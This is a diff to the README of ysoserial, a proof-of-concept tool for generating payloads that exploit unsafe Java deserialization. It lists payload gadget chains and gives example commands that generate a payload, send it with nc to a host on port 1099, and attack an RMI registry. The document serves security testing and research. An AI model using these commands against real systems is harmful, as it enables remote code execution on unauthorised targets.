@@ -6,6 +6,8 @@
     https://gitter.im/frohoff/ysoserial?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
 [![Download Latest Snapshot](https://img.shields.io/badge/download-master--SNAPSHOT-green.svg)](
     https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
+[![Travis Build Status](https://api.travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
+[![Appveyor Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)
 
 A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
 
@@ -39,9 +41,9 @@ are not responsible or liable for misuse of the software. Use responsibly.
 ## Usage
 
 ```shell
-$  java -jar ysoserial-master-v0.0.4-g35bce8f-67.jar
+$  java -jar ysoserial.jar
 Y SO SERIAL?
-Usage: java -jar ysoserial-[version]-all.jar payload command [arguments ...]
+Usage: java -jar ysoserial.jar [payload] '[command]'
   Available payload types:
      Payload             Authors                     Dependencies
      -------             -------                     ------------
@@ -53,7 +55,7 @@ Usage: java -jar ysoserial-[version]-all.jar payload command [arguments ...]
      CommonsCollections2 @frohoff                    commons-collections4:4.0
      CommonsCollections3 @frohoff                    commons-collections:3.1
      CommonsCollections4 @frohoff                    commons-collections4:4.0
-     CommonsCollections5 @frohoff                    commons-collections:3.1
+     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
      CommonsCollections6 @matthias_kaiser            commons-collections:3.1
      FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4
      Groovy1             @frohoff                    groovy:2.3.9
@@ -73,13 +75,13 @@ Usage: java -jar ysoserial-[version]-all.jar payload command [arguments ...]
      Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
      Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
      URLDNS              @gebl
-     Wicket1             @jacob-baines               wicket-util:6.23
+     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
 ```
 
 ## Examples
 
 ```shell
-$ java -jar ysoserial-0.0.4-all.jar CommonsCollections1 calc.exe | xxd
+$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
 0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
 0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
 0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
@@ -88,10 +90,10 @@ $ java -jar ysoserial-0.0.4-all.jar CommonsCollections1 calc.exe | xxd
 0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
 0000570: 0078 7071 007e 003a                      .xpq.~.:
 
-$ java -jar ysoserial-0.0.4-all.jar Groovy1 calc.exe > groovypayload.bin
+$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
 $ nc 10.10.10.10 1099 < groovypayload.bin
 
-$ java -cp ysoserial-0.0.4-all.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
+$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
 ```
 
 ## Installation
@@ -114,6 +116,7 @@ Requires Java 1.7+ and Maven 3.x+
 ## Code Status
 
 [![Build Status](https://travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
+[![Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)
 
 ## Contributing
 
@@ -123,5 +126,7 @@ Requires Java 1.7+ and Maven 3.x+
 4. Push to the branch (`git push origin my-new-feature`)
 5. Create new Pull Request
 
-## Additional Reading
-* https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
+## See Also
+* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet): info on vulnerabilities, tools, blogs/write-ups, etc.
+* [marshalsec](https://github.com/frohoff/marshalsec): similar project for various Java deserialization formats/libraries
+* [ysoserial.net](https://github.com/pwntester/ysoserial.net): similar project for .NET deserialization
